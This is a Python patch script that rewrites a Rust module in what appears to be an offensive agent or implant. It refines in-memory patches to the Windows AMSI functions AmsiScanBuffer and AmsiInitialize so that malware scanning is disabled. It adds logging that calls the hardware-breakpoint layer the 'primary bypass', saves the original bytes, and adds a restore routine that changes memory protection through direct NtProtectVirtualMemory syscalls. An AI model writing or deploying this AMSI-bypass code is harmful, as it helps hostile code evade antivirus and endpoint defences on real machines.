import re

with open("agent/src/amsi_defense.rs", "r") as f:
    content = f.read()

# Requirement 4: proper logging instead of `let _ =`
content = content.replace(
"""pub fn orchestrate_layers() {
    unsafe {
        let _ = patch_amsi_memory();
        let _ = fail_amsi_initialization();
    }
}""",
"""pub fn orchestrate_layers() {
    unsafe {
        if !patch_amsi_memory() {
            log::warn!("Secondary AMSI memory patch failed, HWBP layer remains primary bypass.");
        }
        if !fail_amsi_initialization() {
            log::debug!("Tertiary AmsiInitialize patch failed.");
        }
    }
}"""
)

if "ORIGINAL_SCAN_BYTES" not in content:
    idx = content.find("pub unsafe fn patch_amsi_memory() -> bool {")
    static_vars = """
#[cfg(windows)]
static mut ORIGINAL_SCAN_BYTES: [u8; 6] = [0; 6];
#[cfg(windows)]
static mut ORIGINAL_INIT_BYTES: [u8; 6] = [0; 6];
#[cfg(windows)]
static mut AMSI_SCAN_ADDR: *mut u8 = std::ptr::null_mut();
#[cfg(windows)]
static mut AMSI_INIT_ADDR: *mut u8 = std::ptr::null_mut();

"""
    content = content[:idx] + static_vars + content[idx:]

# Requirement 3: original-byte preservation to both patch_amsi_memory() and fail_amsi_initialization(). Add restore_amsi_patches().

content = content.replace("core::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan as *mut u8, patch.len());",
"""core::ptr::copy_nonoverlapping(amsi_scan as *mut u8, ORIGINAL_SCAN_BYTES.as_mut_ptr(), 6);
    AMSI_SCAN_ADDR = amsi_scan as *mut u8;
    core::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan as *mut u8, patch.len());""")

content = content.replace("core::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_init as *mut u8, patch.len());",
"""core::ptr::copy_nonoverlapping(amsi_init as *mut u8, ORIGINAL_INIT_BYTES.as_mut_ptr(), 6);
    AMSI_INIT_ADDR = amsi_init as *mut u8;
    core::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_init as *mut u8, patch.len());""")

restore_fn = """
#[cfg(windows)]
pub unsafe fn restore_amsi_patches() -> bool {
    // Restore AmsiScanBuffer
    if !AMSI_SCAN_ADDR.is_null() {
        let mut old_protect: u32 = 0;
        let mut base_addr = AMSI_SCAN_ADDR as *mut winapi::ctypes::c_void;
        let mut region_size: usize = 16;
        let _ = (|| -> Result<i32, anyhow::Error> {
            Ok(crate::syscall!("NtProtectVirtualMemory", 
                (-1isize) as usize as u64, 
                &mut base_addr as *mut _ as usize as u64, 
                &mut region_size as *mut _ as usize as u64, 
                PAGE_EXECUTE_READWRITE as u64, 
                &mut old_protect as *mut _ as usize as u64))
        })();
        core::ptr::copy_nonoverlapping(ORIGINAL_SCAN_BYTES.as_ptr(), AMSI_SCAN_ADDR, 6);
        let mut temp: u32 = 0;
        let _ = (|| -> Result<i32, anyhow::Error> {
            Ok(crate::syscall!("NtProtectVirtualMemory", 
                (-1isize) as usize as u64, 
                &mut base_addr as *mut _ as usize as u64, 
                &mut region_size as *mut _ as usize as u64, 
                old_protect as u64, 
                &mut temp as *mut _ as usize as u64))
        })();
    }

    // Restore AmsiInitialize
    if !AMSI_INIT_ADDR.is_null() {
        let mut old_protect: u32 = 0;
        let mut base_addr = AMSI_INIT_ADDR as *mut winapi::ctypes::c_void;
        let mut region_size: usize = 16;
        let _ = (|| -> Result<i32, anyhow::Error> {
            Ok(crate::syscall!("NtProtectVirtualMemory", 
                (-1isize) as usize as u64, 
                &mut base_addr as *mut _ as usize as u64, 
                &mut region_size as *mut _ as usize as u64, 
                PAGE_EXECUTE_READWRITE as u64, 
                &mut old_protect as *mut _ as usize as u64))
        })();
        core::ptr::copy_nonoverlapping(ORIGINAL_INIT_BYTES.as_ptr(), AMSI_INIT_ADDR, 6);
        let mut temp: u32 = 0;
        let _ = (|| -> Result<i32, anyhow::Error> {
            Ok(crate::syscall!("NtProtectVirtualMemory", 
                (-1isize) as usize as u64, 
                &mut base_addr as *mut _ as usize as u64, 
                &mut region_size as *mut _ as usize as u64, 
                old_protect as u64, 
                &mut temp as *mut _ as usize as u64))
        })();
    }
    true
}
"""

if "pub unsafe fn restore_amsi_patches" not in content:
    content = content + restore_fn

with open("agent/src/amsi_defense.rs", "w") as f:
    f.write(content)
